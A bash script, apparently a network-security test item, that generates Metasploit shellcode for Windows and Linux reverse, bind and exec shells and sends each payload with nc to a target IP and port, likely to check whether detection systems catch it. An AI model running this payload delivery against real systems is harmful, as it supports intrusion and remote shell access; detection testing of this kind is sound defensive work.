#!/usr/bin/env bash

TEST_NAME="1.2.2. Transmisión de Shellcodes"
TEST_VERSION="1.0"

MSFPAYLOAD_BIN=`which msfpayload`
MSFPAYLOAD_BIN="/opt/metasploit-framework/msfpayload" # TEMP HACK : hardcoded path
NCAT_BIN=`which nc` 
DATE_FORMAT="+%d/%m/%y %H:%M:%S"

TASK_BREAKTIME=10


function banner () {
	echo "################################################################################"
	echo "# ${TEST_NAME} (${TEST_VERSION})"
	echo "################################################################################"
}

function estimate_time () {
	local life_etime=$(expr 20 \* 5)
	local break_etime=$(expr $TASK_BREAKTIME \* 4)
	local etime=$(expr $life_etime + $break_etime)
	etime=$(expr $etime \/ 60)
	echo "Estimated time: ${etime} minutes"
}

function usage () {
	echo "Usage:"
	echo "  ${0} <target_ip> <target_port>"
}

function write_log () {
	local msg=$1
	local time=`date "$DATE_FORMAT"`
	echo "[${time}] ${msg}"
}

function exec_task () {
	local cmd=$1
	write_log "RUN: ${cmd}"
	echo $cmd | bash &> /dev/null
}

function exec_task_timeout() {
	local cmd=$1
	local timeout=$2
	write_log "TASK START"
	exec_task "$cmd"
#	{ sleep $timeout; kill -9 $task_pid; }	
	write_log "TASK END"
}

function generate_shellcode () {
	local ip=$1
	local port=$2
	local sc_type=$3
#	local sc_encode=$4
 
	local out_file="$(mktemp).$(echo $sc_type | sed 's/\//_/g')"

	# CMD only used for "linux/x86/exec" payload
	${MSFPAYLOAD_BIN} ${sc_type} LHOST=${ip} LPORT=${port} CMD="/bin/sh" R > ${out_file}

	sc_filename=${out_file}
}

function run_test () {
	local target_ip=$1
	local target_port=$2
	local cmd_base="${NCAT_BIN} ${target_ip} ${target_port} -vvv"
	generate_shellcode $target_ip $target_port "windows/shell/reverse_tcp"
	exec_task_timeout "${cmd_base} < ${sc_filename}" $TASK_LIFETIME ; rm -f ${sc_filename}
	sleep $TASK_BREAKTIME
	generate_shellcode $target_ip $target_port "windows/shell/bind_tcp"
	exec_task_timeout "${cmd_base} < ${sc_filename}" $TASK_LIFETIME ; rm -f ${sc_filename}	
	sleep $TASK_BREAKTIME
	generate_shellcode $target_ip $target_port "linux/x86/exec"
	exec_task_timeout "${cmd_base} < ${sc_filename}" $TASK_LIFETIME ; rm -f ${sc_filename}
	sleep $TASK_BREAKTIME
	generate_shellcode $target_ip $target_port "linux/x64/shell/bind_tcp"
	exec_task_timeout "${cmd_base} < ${sc_filename}" $TASK_LIFETIME ; rm -f ${sc_filename}
	sleep $TASK_BREAKTIME
	generate_shellcode $target_ip $target_port "linux/x86/shell/bind_tcp"
	exec_task_timeout "${cmd_base} < ${sc_filename}" $TASK_LIFETIME ; rm -f ${sc_filename}
}

function main () {
	banner
	if [ $# -lt 2 ]; then
		usage
		exit 1
	else
		target_ip=$1
		target_port=$2
	fi

	estimate_time

	run_test $target_ip $target_port
}

main $1 $2
